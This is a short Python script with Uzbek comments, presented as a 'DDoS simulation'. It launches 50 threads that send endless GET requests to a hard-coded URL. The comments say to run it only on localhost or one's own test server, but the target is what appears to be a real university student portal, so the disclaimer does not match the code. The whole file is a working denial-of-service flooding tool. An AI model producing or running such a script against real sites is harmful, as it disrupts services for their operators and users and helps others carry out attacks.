import threading
import requests
import time

# !!! FAQAT localhost yoki o'zingizga tegishli test serveriga ishlating !!!
TARGET_URL = "https://student.astiedu.uz/"  # O'zingizning test saytingiz
THREADS = 50  # Bir vaqtning o'zida ishlaydigan so'rovlar soni
REQUEST_DELAY = 0.1  # Har bir so'rov orasidagi vaqt (sekund)

def send_request():
    while True:
        try:
            requests.get(TARGET_URL, timeout=5)
            print(f"✅ So'rov yuborildi: {TARGET_URL}")
        except Exception as e:
            print(f"❌ Xato: {str(e)}")
        time.sleep(REQUEST_DELAY)

# Testni boshlash
print(f"🔰 DDoS simulyatsiyasi boshlanmoqda ({THREADS} thread)...")
print(f"🔴 Diqqat: Faqat {TARGET_URL} uchun ishlatilmoqda!")

threads = []
for i in range(THREADS):
    thread = threading.Thread(target=send_request)
    thread.daemon = True
    threads.append(thread)
    thread.start()

# Testni to'xtatish uchun Enter bosing
